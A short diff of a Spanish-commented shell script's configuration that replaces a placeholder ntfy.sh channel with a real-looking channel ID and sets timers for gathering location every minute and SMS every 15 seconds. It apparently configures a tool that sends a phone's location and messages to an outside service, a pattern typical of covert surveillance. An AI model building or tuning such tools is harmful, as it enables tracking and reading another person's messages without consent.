@@ -3,7 +3,7 @@
 # Versión optimizada para máxima velocidad
 
 # ===== CONFIGURACIÓN =====
-NTFY_URL="https://ntfy.sh/tu_canal_privado"  # Cambia esto por tu canal real
+NTFY_URL="https://ntfy.sh/V09ci1z1J2A1Iawp"  # Cambia esto por tu canal real
 INTERVALO=300      # 5 minutos para recopilación completa
 LOC_INTERVAL=60    # 1 minuto para ubicación
 SMS_INTERVAL=15    # 15 segundos para verificar SMS
